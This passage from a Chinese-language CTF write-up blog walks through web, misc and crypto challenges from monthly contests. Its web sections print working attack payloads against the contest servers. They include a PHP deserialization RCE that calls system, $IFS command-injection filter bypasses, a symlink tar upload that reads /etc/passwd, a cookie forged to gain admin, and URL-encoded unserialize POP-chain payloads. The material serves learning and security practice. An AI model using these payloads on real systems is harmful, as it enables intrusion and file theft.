class=\"keyword\">private</span> $path;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $filter;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($config=<span class=\"string\">\"\"</span>)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;config = $config;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"number\">123</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getConfig</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;config == <span class=\"string\">\"\"</span>)&#123;</span><br><span class=\"line\">            $config = <span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'config'</span>])?$_POST[<span class=\"string\">'config'</span>]:<span class=\"string\">\"\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SetFilter</span><span class=\"params\">($value)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//        echo $value;</span></span><br><span class=\"line\">        $value=waf_exec($value); </span><br><span class=\"line\">        var_dump($value);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;filter)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span>(<span class=\"keyword\">$this</span>-&gt;filter <span class=\"keyword\">as</span> $filter)&#123;</span><br><span class=\"line\">            $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;filter = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span><span class=\"params\">($key)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//var_dump($key);</span></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;SetFilter($key);</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到在__get()函数，该函数是类在访问私有成员的时候会自动调用这个方法，具体机制还需要研究，然后这里与setfilter函数利用反序列化可以构成rce，在cookie中写入序列化值</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$snow = <span class=\"keyword\">new</span> Config();</span><br><span class=\"line\">$snow-&gt;filter = <span class=\"keyword\">array</span>(<span class=\"string\">'system'</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> base64_encode(serialize($snow));</span><br></pre></td></tr></table></figure>\n<p>然后访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;101.71.29.5:10015&#x2F;index.php?p&#x3D;ls</span><br></pre></td></tr></table></figure>\n<p>发现即可列目录，但是由于过滤了空格和/，所以无法读文件，空格可以使用$IFS绕过，然后利用grep命令来读</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;101.71.29.5:10015&#x2F;index.php?p&#x3D;grep$IFS-ri$IFS.$IFSflag</span><br></pre></td></tr></table></figure>\n<p>这个不理解，需要后续再学习</p>\n<p>在附上官方解法，待研究</p>\n<p><img src=\"/2020/09/13/month-race/11.png\" alt></p>\n<h3 id=\"interesting-web\"><a href=\"#interesting-web\" class=\"headerlink\" title=\"interesting web\"></a>interesting web</h3><p>题目是一个flask框架，题目了修改密码功能，思路是修改admin的密码，flask框架中session<br>是存储在浏览器端的，虽然不能伪造但是可以破解，我们</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">eyJsb2dpbiI6dHJ1ZSwidG9rZW4iOnsiIGIiOiJaamRrWlRaa1l6QmlZVEV4TlRVMU5UWTVaVFV3Wmpaak16ZGxNVFU1TURVPSJ9LCJ1c2VybmFtZSI6ImFkbWluIn0.DuKTNg.LtfGK8IX-4fJ6WO-6mcVJsU2hdI</span><br></pre></td></tr></table></figure>\n<p>第一个.号之前的内容是base64编码的，直接解密就可以了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;login&quot;:true,&quot;token&quot;:&#123;&quot; b&quot;:&quot;ZjdkZTZkYzBiYTExNTU1NTY5ZTUwZjZjMzdlMTU5MDU&#x3D;&quot;&#125;,&quot;username&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>\n<p>再将b的值base64解码就可以得到token了，然后修改密码，以admin身份登录，然后利用软链接来读取文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ln -s /etc/passwd 1.jpg</span><br><span class=\"line\">tar cvfp shell.tat 1.jpg</span><br></pre></td></tr></table></figure>\n<p>然后上传在访问图片，下载之，修改后缀为txt查看即可得到flag</p>\n<h2 id=\"Crypt\"><a href=\"#Crypt\" class=\"headerlink\" title=\"Crypt\"></a>Crypt</h2><h3 id=\"仿射\"><a href=\"#仿射\" class=\"headerlink\" title=\"仿射\"></a>仿射</h3><p>仿射密码，题目已经给出了b的值，对于仿射密码来说</p>\n<p>加密过程为</p>\n<blockquote>\n<p>y≡e(x)≡a(x)+b(mod26)</p>\n</blockquote>\n<p>解密过程</p>\n<blockquote>\n<p>x ≡ d(e(x)) ≡ a’(e(x)-b)(mod26)         # a’为a的逆，在26以内是有限的</p>\n</blockquote>\n<p>我们只需要爆破即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">c = <span class=\"string\">\"achjbnpdfherebjsw\"</span></span><br><span class=\"line\">b=<span class=\"number\">7</span></span><br><span class=\"line\">flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> (<span class=\"number\">1</span>,<span class=\"number\">9</span>,<span class=\"number\">21</span>,<span class=\"number\">15</span>,<span class=\"number\">3</span>,<span class=\"number\">19</span>,<span class=\"number\">7</span>,<span class=\"number\">23</span>,<span class=\"number\">11</span>,<span class=\"number\">5</span>,<span class=\"number\">17</span>,<span class=\"number\">25</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> c:</span><br><span class=\"line\">        seq = (i*((ord(s)-ord(<span class=\"string\">'a'</span>))-b)) % <span class=\"number\">26</span></span><br><span class=\"line\">        flag += chr(ord(<span class=\"string\">'a'</span>)+seq)</span><br><span class=\"line\">    print(flag)</span><br><span class=\"line\">    flag = <span class=\"string\">\"\"</span></span><br></pre></td></tr></table></figure>\n<p>然后即可找到flag</p>\n<p><img src=\"/2020/09/13/month-race/12.png\" alt></p>\n<!-- youareright -->\n<h2 id=\"MISC-1\"><a href=\"#MISC-1\" class=\"headerlink\" title=\"MISC\"></a>MISC</h2><h3 id=\"MISC1\"><a href=\"#MISC1\" class=\"headerlink\" title=\"MISC1\"></a>MISC1</h3><p>题目如下</p>\n<blockquote>\n<p>中华文化博大精深，近日在教小外甥学习1-110之间的数字，可是小外甥比较调皮，不好好学，于是灵机一动，想到一个容易记忆，并且还可以识字的好办法，你知道我想出了什么办法吗？下边是在教外甥学习的一部分内容，你知道分别代表什么意思吗？</p>\n<p>（企鹅，青蛙，油漆，花旗参，救生圈，油漆，二胡，二石，漏斗，二石，二石，冰淇淋，漏斗，喇叭，油漆，冰淇淋，鹅卵石，21世纪，耳机，油漆，耳机，二石，二胡，耳机，21世纪，企鹅，二流子，二石，要发，二石，冰淇淋，冰淇淋，油漆，冰淇淋，企鹅，乔丹，二石，酒壶）</p>\n</blockquote>\n<p>这是一种数字密码表，好像叫110数字记忆表，是帮助提高记忆力的</p>\n<p>直接网上找对应的值然后脚本，获取数字之后，每个数字的加30取ascii码值就是flag</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">cipher = (<span class=\"string\">\"企鹅\"</span>,<span class=\"string\">\"青蛙\"</span>,<span class=\"string\">\"油漆\"</span>,<span class=\"string\">\"花旗参\"</span>,<span class=\"string\">\"救生圈\"</span>,<span class=\"string\">\"油漆\"</span>,<span class=\"string\">\"二胡\"</span>,<span class=\"string\">\"二石\"</span>,<span class=\"string\">\"漏斗\"</span>,<span class=\"string\">\"二石\"</span>,<span class=\"string\">\"二石\"</span>,<span class=\"string\">\"冰淇淋\"</span>,<span class=\"string\">\"漏斗\"</span>,<span class=\"string\">\"喇叭\"</span>,</span><br><span class=\"line\"><span class=\"string\">\"油漆\"</span>,<span class=\"string\">\"冰淇淋\"</span>,<span class=\"string\">\"鹅卵石\"</span>,<span class=\"string\">\"21世纪\"</span>,<span class=\"string\">\"耳机\"</span>,<span class=\"string\">\"油漆\"</span>,<span class=\"string\">\"耳机\"</span>,<span class=\"string\">\"二石\"</span>,<span class=\"string\">\"二胡\"</span>,<span class=\"string\">\"耳机\"</span>,<span class=\"string\">\"21世纪\"</span>,<span class=\"string\">\"企鹅\"</span>,<span class=\"string\">\"二流子\"</span>,<span class=\"string\">\"二石\"</span>,<span class=\"string\">\"要发\"</span>,</span><br><span class=\"line\"><span class=\"string\">\"二石\"</span>,<span class=\"string\">\"冰淇淋\"</span>,<span class=\"string\">\"冰淇淋\"</span>,<span class=\"string\">\"油漆\"</span>,<span class=\"string\">\"冰淇淋\"</span>,<span class=\"string\">\"企鹅\"</span>,<span class=\"string\">\"乔丹\"</span>,<span class=\"string\">\"二石\"</span>,<span class=\"string\">\"酒壶\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">dic = &#123;<span class=\"string\">\"企鹅\"</span>:<span class=\"number\">72</span>,<span class=\"string\">\"青蛙\"</span>:<span class=\"number\">78</span>,<span class=\"string\">\"油漆\"</span>:<span class=\"number\">67</span>,<span class=\"string\">\"花旗参\"</span>:<span class=\"number\">73</span>,<span class=\"string\">\"救生圈\"</span>:<span class=\"number\">93</span>,<span class=\"string\">\"二胡\"</span>:<span class=\"number\">25</span>,<span class=\"string\">\"二石\"</span>:<span class=\"number\">20</span>,<span class=\"string\">\"漏斗\"</span>:<span class=\"number\">69</span>,<span class=\"string\">\"喇叭\"</span>:<span class=\"number\">68</span>,<span class=\"string\">\"冰淇淋\"</span>:<span class=\"number\">70</span>,</span><br><span class=\"line\"><span class=\"string\">\"鹅卵石\"</span>:<span class=\"number\">24</span>,<span class=\"string\">\"21世纪\"</span>:<span class=\"number\">21</span>,<span class=\"string\">\"耳机\"</span>:<span class=\"number\">27</span>,<span class=\"string\">\"二流子\"</span>:<span class=\"number\">26</span>,<span class=\"string\">\"要发\"</span>:<span class=\"number\">18</span>,<span class=\"string\">\"乔丹\"</span>:<span class=\"number\">23</span>,<span class=\"string\">\"酒壶\"</span>:<span class=\"number\">95</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">nums = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> cipher:</span><br><span class=\"line\">    temp = dic.get(item)</span><br><span class=\"line\">    nums += str(temp)</span><br><span class=\"line\">flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(nums)//<span class=\"number\">2</span>):</span><br><span class=\"line\">    flag += chr(int(nums[<span class=\"number\">2</span>*i:<span class=\"number\">2</span>*i+<span class=\"number\">2</span>])+<span class=\"number\">30</span>)</span><br><span class=\"line\">print(flag)</span><br></pre></td></tr></table></figure>\n<h1 id=\"12月月赛\"><a href=\"#12月月赛\" class=\"headerlink\" title=\"12月月赛\"></a>12月月赛</h1><h2 id=\"MISC-2\"><a href=\"#MISC-2\" class=\"headerlink\" title=\"MISC\"></a>MISC</h2><h3 id=\"签到题\"><a href=\"#签到题\" class=\"headerlink\" title=\"签到题\"></a>签到题</h3><p>关注公主号，回复flag会返回一个问题 <code>什么牛不会跑</code> ，答案是 <code>蜗牛</code> ,然后即可得到flag</p>\n<!-- flag{6ef1b2246e5e651a46bfa51cfa71b763} -->\n<h3 id=\"学习资料\"><a href=\"#学习资料\" class=\"headerlink\" title=\"学习资料\"></a>学习资料</h3><p>尝试爆破，但是爆破了好久都没有成功，最终无奈看了一下题解，解开压缩包，之后就是docx隐写，在设置中显示隐藏文字即可。</p>\n<!-- Flag{edaa144c91a4e5b817e4a18cbdb78879} -->\n<h3 id=\"变换的指纹\"><a href=\"#变换的指纹\" class=\"headerlink\" title=\"变换的指纹\"></a>变换的指纹</h3><p>用CSDN密码库密码爆破。我失败了，看了别人的密码<code>!(()!@)6125dou</code>（注意结尾的空格），之后即可得到压缩包，</p>\n<p>23685528276158852365572716835687172857481317</p>\n<h3 id=\"JUJU\"><a href=\"#JUJU\" class=\"headerlink\" title=\"JUJU\"></a>JUJU</h3><p>题目提示了说<code>11只JUJU</code>，但是图片中却不够11个，可知是图片高度的问题，修改一下图片高度</p>\n<p><img src=\"https://i.loli.net/2019/01/17/5c40908a8abf5.png\" alt></p>\n<p>然后即可看到类似base64编码的字符串<code>MZWGCZ33GQZTQMTEM5SGMMTEPU====</code>，但是解码失败，尝试后发现是base32编码的，解密即可得到flag<code>flag{4382dgdf2d}</code></p>\n<h3 id=\"菜刀666\"><a href=\"#菜刀666\" class=\"headerlink\" title=\"菜刀666\"></a>菜刀666</h3><p>先随便查看http流量，在最后的流量中发现了压缩包的传输，查看流量大致可以看到黑客是不断探测目录，最终探测出了flag坐在目录，向服务器请求了hello.zip的文件内容，将文件提取出来，发现在文件末尾有提示文字<code>well,you need passwd!</code>，可知zip压缩包基本不可能是伪加密，应该是需要密码的，再次查看流量包，发现一条超长的http的数据包，发现一段jpg图片的十六进制，提取存储为jpg图片</p>\n<p><img src=\"https://i.loli.net/2019/01/18/5c41e9b279481.png\" alt></p>\n<p>打开图片即可看到密码，解压即可看到flag</p>\n<!-- flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z} -->\n<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"easy\"><a href=\"#easy\" class=\"headerlink\" title=\"easy\"></a>easy</h3><p>代码审计，关键过滤如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">preg_match(<span class=\"string\">'/[oc]:\\d+:/i'</span>,$data,$matches);</span><br></pre></td></tr></table></figure>\n<p>可以看到是为了防止object类的序列化，但是过滤不够严谨，可以用 <code>+</code> 绕过 <code>o:14 -&gt; o:+14</code> </p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">@error_reporting(<span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">baby</span> </span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;   </span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span>      </span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;          </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;file)) </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            $filename = <span class=\"string\">\"./&#123;$this-&gt;file&#125;\"</span>;        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (file_get_contents($filename))         </span><br><span class=\"line\">            &#123;              </span><br><span class=\"line\">                <span class=\"keyword\">return</span> file_get_contents($filename); </span><br><span class=\"line\">            &#125; </span><br><span class=\"line\">        &#125;     </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">$data = <span class=\"keyword\">new</span> baby();</span><br><span class=\"line\">$data-&gt;file = <span class=\"string\">\"flag.php\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">print</span>(serialize(($data)));<span class=\"comment\">//给输出加一个加号在url编码一下</span></span><br></pre></td></tr></table></figure>\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;101.71.29.5:10007&#x2F;?data&#x3D;O%3A%2B4%3A%22baby%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></pre></td></tr></table></figure>\n<!-- flag{ad2328a2c3f0933c053fd3c6f28f6143} -->\n<h3 id=\"ezweb2\"><a href=\"#ezweb2\" class=\"headerlink\" title=\"ezweb2\"></a>ezweb2</h3><p>既然是渗透测试，扫描一下目录，发现存在admin.php，登录后返回 <code>you are not admin.</code> ，查看cookie发现user值为<code>user</code>的base64值，我们将此值修改为 <code>admin</code> 的base64值，然后刷新可以看到一个命令执行界面，测试发现题目过滤了空格，尝试用$IFS绕过<br><code>cat$IFS/ffLAG_404</code> ，然后即可成功绕过</p>\n<p><img src=\"https://i.loli.net/2019/01/16/5c3f3979d4b1c.png\" alt=\"result\"></p>\n<!-- flag{6f1d95159e3b90ed28186c518dd15e8c} -->\n<h1 id=\"1月月赛\"><a href=\"#1月月赛\" class=\"headerlink\" title=\"1月月赛\"></a>1月月赛</h1><h2 id=\"web-2\"><a href=\"#web-2\" class=\"headerlink\" title=\"web\"></a>web</h2><h3 id=\"babygo\"><a href=\"#babygo\" class=\"headerlink\" title=\"babygo\"></a>babygo</h3><p>代码审计题目</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">@error_reporting(<span class=\"number\">1</span>); </span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'flag.php'</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">baby</span> </span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;   </span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $skyobj;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> $aaa;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $bbb;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span> </span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;      </span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;skyobj = <span class=\"keyword\">new</span> sec;</span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span>      </span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;          </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;skyobj))  </span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">cool</span> </span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> $filename;     </span><br><span class=\"line\">    <span class=\"keyword\">public</span> $nice;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $amzing; </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">read</span><span class=\"params\">()</span>      </span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;   </span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;nice = unserialize(<span class=\"keyword\">$this</span>-&gt;amzing);</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;nice-&gt;aaa === <span class=\"keyword\">$this</span>-&gt;nice-&gt;bbb)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            $file = <span class=\"string\">\"./&#123;$this-&gt;filename&#125;\"</span>;        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (file_get_contents($file))         </span><br><span class=\"line\">            &#123;              </span><br><span class=\"line\">                <span class=\"keyword\">return</span> file_get_contents($file); </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">            <span class=\"keyword\">else</span> </span><br><span class=\"line\">            &#123; </span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">\"you must be joking!\"</span>; </span><br><span class=\"line\">            &#125;    </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">sec</span> </span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;  </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">read</span><span class=\"params\">()</span>     </span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;          </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"it's so sec~~\"</span>;      </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'data'</span>]))  </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    $Input_data = unserialize($_GET[<span class=\"string\">'data'</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $Input_data; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    highlight_file(<span class=\"string\">\"./index.php\"</span>); </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>题目考察pop链的构造，核心点在于</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;nice-&gt;aaa === <span class=\"keyword\">$this</span>-&gt;nice-&gt;bbb)</span><br></pre></td></tr></table></figure>\n<p>代码中修改了变量的值，这样if函数验证就无法通过，为了解决这个问题可以使用PHP中的指针（引用），是$aaa指向变量$bbb，这样修改了$aaa的值即相当于修改了$bbb的值</p>\n<p>构造pop链如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">error_reporting(<span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">baby</span> </span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;   </span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $skyobj;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> $aaa;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $bbb;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span> </span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;      </span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;skyobj = <span class=\"keyword\">new</span> cool();</span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">cool</span> </span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> $filename = <span class=\"string\">\"flag.php\"</span>;     </span><br><span class=\"line\">    <span class=\"keyword\">public</span> $nice;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $amzing = <span class=\"string\">'O:4:\"baby\":3:&#123;s:9:\" * skyobj\";N;s:3:\"aaa\";s:4:\"snow\";s:3:\"bbb\";R:3;&#125;'</span>; </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">$b = <span class=\"keyword\">new</span> baby();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">data&#x3D;O%3A4%3A&quot;baby&quot;%3A3%3A%7Bs%3A9%3A&quot;%00%2A%00skyobj&quot;%3BO%3A4%3A&quot;cool&quot;%3A3%3A%7Bs%3A8%3A&quot;filename&quot;%3Bs%3A8%3A&quot;flag.php&quot;%3Bs%3A4%3A&quot;nice&quot;%3BN%3Bs%3A6%3A&quot;amzing&quot;%3Bs%3A68%3A&quot;O%3A4%3A&quot;baby&quot;%3A3%3A%7Bs%3A9%3A&quot;+%2A+skyobj&quot;%3BN%3Bs%3A3%3A&quot;aaa&quot;%3Bs%3A4%3A&quot;snow&quot;%3Bs%3A3%3A&quot;bbb&quot;%3BR%3A3%3B%7D&quot;%3B%7Ds%3A3%3A&quot;aaa&quot;%3BN%3Bs%3A3%3A&quot;bbb&quot;%3BN%3B%7D</span><br></pre></td></tr></table></figure>\n<p>查看源代码即可得到flag</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// $flag = 'flag&#123;bd75a38e62ec0e450745a8eb8e667f5b&#125;';</span></span><br><span class=\"line\">$sth=<span class=\"string\">'test5030b66d4bdtest35daed9d51e2688377299test'</span>;</span><br></pre></td></tr></table></figure>\n<h2 id=\"MISC-3\"><a href=\"#MISC-3\" class=\"headerlink\" title=\"MISC\"></a>MISC</h2><h3 id=\"zhunianjixiang\"><a href=\"#zhunianjixiang\" class=\"headerlink\" title=\"zhunianjixiang\"></a>zhunianjixiang</h3><p>题目是一张图片，但是却有2MB，一看就藏东西了，foremost分离一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">foremost zhu.jpg</span><br></pre></td></tr></table></figure>\n<p>然后即可得到一张二维码，扫描一下</p>\n<p><img src=\"https://i.loli.net/2019/01/31/5c52a84fc2d4e.png\" alt></p>\n<p>看来还有其他东西，stegsolve上查看一下得到flag</p>\n<p><img src=\"https://i.loli.net/2019/01/31/5c52a85a2c2bf.png\" alt></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#123;You_ARE_SOsmart&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"CRYPTO\"><a href=\"#CRYPTO\" class=\"headerlink\" title=\"CRYPTO\"></a>CRYPTO</h2><h3 id=\"真的是键盘吗\"><a href=\"#真的是键盘吗\" class=\"headerlink\" title=\"真的是键盘吗\"></a>真的是键盘吗</h3><blockquote>\n<p>ypau_kjg;”g;”ypau+</p>\n</blockquote>\n<p>题目的提示不好，原题目的提示是<code>键盘之争</code>，百度一下即可发现是考察键盘的两种布局方式<a href=\"http://www.ruanyifeng.com/blog/2006/11/disputation_of_keyboards_qwerty_or_dvorak.html\" target=\"_blank\" rel=\"noopener\">链接</a>，按照两种方式一一对应即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">QWERTY = [<span class=\"string\">'q'</span>,<span class=\"string\">'w'</span>,<span class=\"string\">'e'</span>,<span class=\"string\">'r'</span>,<span class=\"string\">'t'</span>,<span class=\"string\">'y'</span>,<span class=\"string\">'u'</span>,<span class=\"string\">'i'</span>,<span class=\"string\">'o'</span>,<span class=\"string\">'p'</span>,<span class=\"string\">'&#123;'</span>,<span class=\"string\">'&#125;'</span>,<span class=\"string\">'|'</span>,<span class=\"string\">'a'</span>,<span class=\"string\">'s'</span>,<span class=\"string\">'d'</span>,<span class=\"string\">'f'</span>,<span class=\"string\">'g'</span>,<span class=\"string\">'h'</span>,<span class=\"string\">'j'</span>,<span class=\"string\">'k'</span>,<span class=\"string\">'l'</span>,<span class=\"string\">';'</span>,<span class=\"string\">'\"'</span>,<span class=\"string\">'z'</span>,<span class=\"string\">'x'</span>,<span class=\"string\">'c'</span>,<span class=\"string\">'v'</span>,<span class=\"string\">'b'</span>,<span class=\"string\">'n'</span>,<span class=\"string\">'m'</span>,<span class=\"string\">'&lt;'</span>,<span class=\"string\">'&gt;'</span>,<span class=\"string\">'?'</span>,<span class=\"string\">'_'</span>,<span class=\"string\">'+'</span>]</span><br><span class=\"line\">Dvorak = [<span class=\"string\">'\"'</span>,<span class=\"string\">'&lt;'</span>,<span class=\"string\">'&gt;'</span>,<span class=\"string\">'p'</span>,<span class=\"string\">'y'</span>,<span class=\"string\">'f'</span>,<span class=\"string\">'g'</span>,<span class=\"string\">'c'</span>,<span class=\"string\">'r'</span>,<span class=\"string\">'l'</span>,<span class=\"string\">'?'</span>,<span class=\"string\">'+'</span>,<span class=\"string\">'|'</span>,<span class=\"string\">'a'</span>,<span class=\"string\">'o'</span>,<span class=\"string\">'e'</span>,<span class=\"string\">'u'</span>,<span class=\"string\">'i'</span>,<span class=\"string\">'d'</span>,<span class=\"string\">'h'</span>,<span class=\"string\">'t'</span>,<span class=\"string\">'n'</span>,<span class=\"string\">'s'</span>,<span 